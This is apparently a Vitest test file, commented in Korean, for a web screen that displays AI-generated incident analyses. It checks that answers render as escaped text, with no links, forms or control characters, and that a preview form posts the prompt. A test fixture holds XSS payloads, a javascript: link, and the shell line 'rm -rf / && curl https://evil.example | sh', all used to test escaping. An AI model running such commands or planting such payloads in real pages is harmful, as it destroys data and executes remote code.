/** 분석 화면 — 글로만 보인다(명세 ⑫ §19 "보이기" · §13 "이스케이프는 보이는 쪽의 일").
 * 계약:
 * - 답의 다섯 칸은 React 의 글자 출력으로만 — 마크다운 · HTML 을 풀지 않고 링크로 만들지 않는다(`<a` · `<img` · `<script` · `on*=` · `javascript:` 링크가 답에서 생기지 않는다).
 *   제어 문자(줄바꿈 · 탭 밖)와 서식 문자(Cf — U+202E · U+200B · U+FEFF)는 지운다. 아주 긴 한 줄도 자르지 않는다.
 * - 권하는 조치는 ANALYSIS_ACTION_LABELS 의 글뿐(단추 · 폼 · 링크 없음) · INCIDENT_ANALYSIS_TEXT.disclaimer 가 늘 있다.
 * - 보낸 글 그대로는 `<details>` 안의 `<pre>` — 저장된 글 그대로(다시 만들지 않는다).
 * - 진행 중일 때만 `<meta http-equiv="refresh" content="5"/>`. 끊김 · 실패 · 옛 분석 · 읽을 수 없음 · 저장소 없음은 각자의 고정 글.
 * - 미리보기(preview ready): 보낼 글 그대로의 `<pre>` · `<N>바이트 · <M>자` · 줄인 것 · 가린 것(`가린 것: <종류> <수> · …`) ·
 *   POST 폼(action /api/incidents/analysis) — 숨은 칸 incident · preview(서명 값) · prompt(보낼 글 그대로) · 단추 "이 글을 보낸다". 폼은 미리보기에만 있다.
 * - "분석 요청" 링크(/incidents/analysis?incident=<id>&preview=1)는 문제가 열려 있고 저장소가 있고 진행 중이 아닐 때만. */
import { createElement } from "react";
import { describe, expect, it } from "vitest";
import { IncidentAnalysisScreen } from "@/features/incident-analysis/ui/IncidentAnalysisScreen";
import {
  ANALYSIS_FAILURE_TEXTS, INCIDENT_ANALYSIS_TEXT, type AnalysisHistoryView, type AnalysisPreviewState, type IncidentAnalysisScreenData,
} from "@/features/incident-analysis/lib/incident-analysis-screen";
import { ANALYSIS_ACTION_LABELS, type AnalysisAnswer } from "@/features/incident-analysis/lib/analysis-answer";
import type { AnalysisEntry, StoredAnalysisAttempt } from "@/features/incident-analysis/lib/incident-analysis-service";

const NOW_TEXT = "2026-11-27T06:00:00.000Z";
const LONG_LINE = "L".repeat(20_000);

function attempt(overrides: Partial<StoredAnalysisAttempt> = {}): StoredAnalysisAttempt {
  return {
    version: 1, requestId: "adm-a-1", incidentId: "monitor:front", incidentSince: "2026-11-27T05:40:00.000Z", account: "admin:jun",
    startedAt: "2026-11-27T05:50:00.000Z", prompt: "보낸 글 <b>그대로</b>\n<<<자료 시작 abc>>>", promptBytes: 40, state: "succeeded",
    finishedAt: "2026-11-27T05:50:41.000Z", durationMilliseconds: 41_000,
    answer: { cause: "원인", evidence: ["근거"], confidence: "high", remedy: "대처", recommendedAction: "rollback" }, failureReason: null, ...overrides,
  };
}

function entry(value: StoredAnalysisAttempt, status: Extract<AnalysisEntry, { kind: "attempt" }>["status"] = "succeeded", fromEarlierOpening = false): AnalysisEntry {
  return { kind: "attempt", attempt: value, status, fromEarlierOpening };
}

function data(history: AnalysisHistoryView, overrides: Partial<IncidentAnalysisScreenData> = {}): IncidentAnalysisScreenData {
  return {
    checkedAt: NOW_TEXT, incidentId: "monitor:front", incident: { state: "open", kindLabel: "감시 대상 DOWN", target: "front", since: "2026-11-27T05:40:00.000Z" },
    history, preview: null, ...overrides,
  };
}

async function render(screenData: IncidentAnalysisScreenData | null): Promise<string> {
  const element = createElement(IncidentAnalysisScreen, { outcome: screenData === null ? { kind: "invalid_input" } : { kind: "screen", data: screenData } });
  const rendererModuleName = "react-dom/server";
  const renderer = (await import(/* @vite-ignore */ rendererModuleName)) as { renderToStaticMarkup: (node: unknown) => string };
  return renderer.renderToStaticMarkup(element);
}

function textOf(html: string): string {
  return html.replace(/<[^>]+>/g, "").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, "\"").replace(/&#x27;/g, "'").replace(/&amp;/g, "&");
}

function unescapeAttribute(value: string): string {
  return value.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, "\"").replace(/&#x27;/g, "'").replace(/&amp;/g, "&").replace(/&#10;/g, "\n");
}

const HOSTILE: AnalysisAnswer = {
  cause: "**굵게** <script>alert(1)</script> <img src=x onerror=alert(2)> [눌러](javascript:alert(3)) <a href=\"https://evil.example\">링크</a>",
  evidence: ["\u202E뒤집힌 글\u200B\uFEFF 끝", "제어\u0000\u0007\u001b[31m 빨강", LONG_LINE, "rm -rf / && curl https://evil.example | sh"],
  confidence: "low",
  remedy: "<form action=/api/deploys/redeploy method=post><button>되돌리기</button></form>\n# 제목\n- 목록",
  recommendedAction: "rollback",
};

describe("답은 글로만 — 마크다운 · HTML · 링크 · 단추가 생기지 않는다", () => {
  it("해로운 다섯 칸 — 글자는 보이되 태그 · 링크 · 실행할 것이 없다", async () => {
    const html = await render(data({ ok: true, entries: [entry(attempt({ answer: HOSTILE }))] }));
    for (const forbidden of ["<script", "<img", "<form", "<button", "<input", "href=\"https://evil.example\""]) expect(html).not.toContain(forbidden);
    expect(html).not.toMatch(/(href|src|action)="\s*javascript:/i);
    for (const tag of html.match(/<[a-z][^>]*>/gi) ?? []) expect(tag).not.toMatch(/\son[a-z]+=/i);
    const text = textOf(html);
    expect(text).toContain("**굵게** <script>alert(1)</script>");
    expect(text).toContain("[눌러](javascript:alert(3))");
    expect(text).toContain("rm -rf / && curl https://evil.example | sh");
    expect(text).toContain(LONG_LINE);
    expect(text).toContain("# 제목");
    const anchors = [...html.matchAll(/<a\b[^>]*href="([^"]*)"/g)].map((match) => unescapeAttribute(match[1]));
    for (const href of anchors) expect(href, href).toMatch(/^\/(incidents|claude-usage)([/?#]|$)/);
  });

  it("제어 · 서식 문자는 지운다(줄바꿈은 남는다)", async () => {
    const html = await render(data({ ok: true, entries: [entry(attempt({ answer: HOSTILE }))] }));
    for (const character of ["\u202E", "\u200B", "\uFEFF", "\u0000", "\u0007", "\u001b"]) expect(html).not.toContain(character);
    expect(textOf(html)).toContain("뒤집힌 글 끝");
    expect(textOf(html)).toContain("[31m 빨강");
  });

  it.each([["rollback"], ["redeploy"], ["none"]] as const)("권하는 조치 %s — 표시 글뿐(누를 것이 없다)", async (action) => {
    const html = await render(data({ ok: true, entries: [entry(attempt({ answer: { ...attempt().answer!, recommendedAction: action } }))] }));
    expect(textOf(html)).toContain(ANALYSIS_ACTION_LABELS[action]);
    for (const forbidden of ["<form", "<button", "<input", "/api/deploys"]) expect(html).not.toContain(forbidden);
  });

  it("'분석은 틀릴 수 있습니다' 한 줄 · 다섯 칸의 제목", async () => {
    const text = textOf(await render(data({ ok: true, entries: [entry(attempt())] })));
    expect(INCIDENT_ANALYSIS_TEXT.disclaimer).toBe("분석은 틀릴 수 있습니다 — 근거와 함께 확인하세요");
    for (const title of [INCIDENT_ANALYSIS_TEXT.disclaimer, "원인", "근거", "확신의 정도", "대처법", "권하는 조치", "높음", "되돌리기를 권함"]) expect(text).toContain(title);
  });

  it("보낸 글 그대로를 펴 볼 수 있다 — 저장된 글(이스케이프된 글자)", async () => {
    const html = await render(data({ ok: true, entries: [entry(attempt())] }));
    const details = /<details[^>]*>([\s\S]*?)<\/details>/.exec(html);
    expect(details, "details 가 없다").not.toBeNull();
    expect(details![1]).toMatch(/<summary[^>]*>보낸 글 그대로<\/summary>/);
    expect(details![1]).toContain("<pre");
    expect(textOf(details![1])).toContain("보낸 글 <b>그대로</b>\n<<<자료 시작 abc>>>");
    expect(details![1]).not.toContain("<b>");
  });
});

describe("상태마다의 글", () => {
  it("진행 중 — 다시 읽기(5초) · 요청 링크 없음", async () => {
    const html = await render(data({ ok: true, entries: [entry(attempt({ state: "running", finishedAt: null, durationMilliseconds: null, answer: null }), "running")] }));
    expect(html).toContain('<meta http-equiv="refresh" content="5"/>');
    expect(textOf(html)).toContain(INCIDENT_ANALYSIS_TEXT.running);
    expect(html).not.toContain("preview=1");
  });

  it("끝난 분석만이면 다시 읽지 않는다 · 요청 링크가 있다", async () => {
    const html = await render(data({ ok: true, entries: [entry(attempt())] }));
    expect(html).not.toContain("http-equiv");
    expect(html).toMatch(/<a[^>]*href="\/incidents\/analysis\?incident=monitor%3Afront&amp;preview=1"[^>]*>분석 요청 — 보낼 글 미리 보기<\/a>/);
  });

  it("끊김 — 결과를 모름 · 다시 요청할 수 있다", async () => {
    const html = await render(data({ ok: true, entries: [entry(attempt({ state: "running", answer: null }), "interrupted")] }));
    expect(textOf(html)).toContain(INCIDENT_ANALYSIS_TEXT.interrupted);
    expect(html).not.toContain("http-equiv");
    expect(html).toContain("preview=1");
  });

  it("실패 — 까닭의 고정 글(까닭마다 다르고 주소가 없다)", async () => {
    const html = await render(data({ ok: true, entries: [entry(attempt({ state: "failed", answer: null, failureReason: "limit_reached" }), "failed")] }));
    expect(textOf(html)).toContain(ANALYSIS_FAILURE_TEXTS.limit_reached);
    const texts = Object.values(ANALYSIS_FAILURE_TEXTS);
    expect(new Set(texts).size).toBe(texts.length);
    for (const text of texts) expect(text).not.toMatch(/https?:|example\.test|\d+\.\d+\.\d+\.\d+/);
  });

  it("옛 분석 — 닫혔다 다시 열린 뒤", async () => {
    const text = textOf(await render(data({ ok: true, entries: [entry(attempt(), "succeeded", true)] })));
    expect(text).toContain(INCIDENT_ANALYSIS_TEXT.earlierOpening);
  });

  it("읽을 수 없는 기록 · 저장소 없음 · 분석 없음", async () => {
    expect(textOf(await render(data({ ok: true, entries: [{ kind: "unreadable" }, entry(attempt())] })))).toContain(INCIDENT_ANALYSIS_TEXT.unreadable);
    const unavailable = await render(data({ ok: false, reason: "store_unavailable" }));
    expect(textOf(unavailable)).toContain(INCIDENT_ANALYSIS_TEXT.storeUnavailable);
    expect(unavailable).not.toContain("preview=1");
    expect(textOf(await render(data({ ok: true, entries: [] })))).toContain(INCIDENT_ANALYSIS_TEXT.noAnalysis);
  });

  it("닫힘 · 확인하지 못함 — 요청 링크가 없다", async () => {
    for (const [incident, text] of [[{ state: "closed" }, INCIDENT_ANALYSIS_TEXT.closed], [{ state: "unchecked" }, INCIDENT_ANALYSIS_TEXT.unchecked]] as const) {
      const html = await render(data({ ok: true, entries: [] }, { incident }));
      expect(textOf(html)).toContain(text);
      expect(html).not.toContain("preview=1");
      expect(html).not.toContain("<form");
    }
  });
});

describe("미리보기 — 보낼 글 그대로와 보내기 폼", () => {
  const PROMPT = "지시문\n<<<자료 시작 0123456789abcdef0123456789abcdef>>>\n# 문제: 감시 대상 DOWN — front\n- password=[가림:secret_field] <i>x</i> \"따옴표\" &amp;\n<<<자료 끝 0123456789abcdef0123456789abcdef>>>";
  const preview: AnalysisPreviewState = { kind: "ready", view: {
    prompt: PROMPT, token: "ap1.1764223200000.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQ", characters: Array.from(PROMPT).length, bytes: 321,
    reductions: ["로그 100줄 중 오래된 40줄을 뺐습니다(크기 상한)"], maskCounts: { secret_field: 1, token: 2 },
  } };

  it("보낼 글 그대로 · 바이트 수 · 자 수 · 줄인 것 · 가린 것", async () => {
    const html = await render(data({ ok: true, entries: [] }, { preview }));
    const text = textOf(html);
    expect(text).toContain(INCIDENT_ANALYSIS_TEXT.previewTitle);
    expect(text).toContain(`321바이트 · ${Array.from(PROMPT).length}자`);
    expect(text).toContain("로그 100줄 중 오래된 40줄을 뺐습니다(크기 상한)");
    expect(text).toContain("가린 것: secret_field 1 · token 2");
    const pre = /<pre[^>]*>([\s\S]*?)<\/pre>/.exec(html);
    expect(textOf(pre![1])).toBe(PROMPT);
  });

  it("폼 — POST /api/incidents/analysis · 숨은 칸 셋(incident · preview · prompt = 보낼 글 그대로) · 단추 하나", async () => {
    const html = await render(data({ ok: true, entries: [] }, { preview }));
    const forms = [...html.matchAll(/<form\b([^>]*)>([\s\S]*?)<\/form>/g)];
    expect(forms).toHaveLength(1);
    expect(forms[0][1]).toMatch(/method="post"/);
    expect(forms[0][1]).toMatch(/action="\/api\/incidents\/analysis"/);
    const inputs = [...forms[0][2].matchAll(/<input\b([^>]*)\/?>/g)].map((match) => match[1]);
    const field = (name: string) => {
      const tag = inputs.find((attributes) => new RegExp(`name="${name}"`).test(attributes));
      expect(tag, `${name} 칸이 없다`).toBeDefined();
      expect(tag).toMatch(/type="hidden"/);
      return unescapeAttribute(/value="([^"]*)"/.exec(tag!)![1]);
    };
    expect(field("incident")).toBe("monitor:front");
    expect(field("preview")).toBe(preview.view.token);
    expect(field("prompt")).toBe(PROMPT);
    expect(inputs).toHaveLength(3);
    expect([...forms[0][2].matchAll(/<button\b[^>]*type="submit"[^>]*>([^<]*)<\/button>/g)].map((match) => match[1])).toEqual(["이 글을 보낸다"]);
  });

  it("미리보기를 만들 수 없으면(too_long 등) 그 글 · 폼 없음", async () => {
    const html = await render(data({ ok: true, entries: [] }, { preview: { kind: "unavailable", text: "보낼 글이 6만 자를 넘어 보낼 수 없습니다" } }));
    expect(textOf(html)).toContain("보낼 글이 6만 자를 넘어 보낼 수 없습니다");
    expect(html).not.toContain("<form");
  });

  it("미리보기가 아닐 때는 폼이 없다", async () => {
    expect(await render(data({ ok: true, entries: [entry(attempt())] }))).not.toContain("<form");
  });
});

describe("입력 거절", () => {
  it("틀린 식별자 — 문제 화면으로 가는 링크", async () => {
    const html = await render(null);
    expect(html).toMatch(/<a[^>]*href="\/incidents"[^>]*>/);
    expect(html).not.toContain("<form");
  });
});
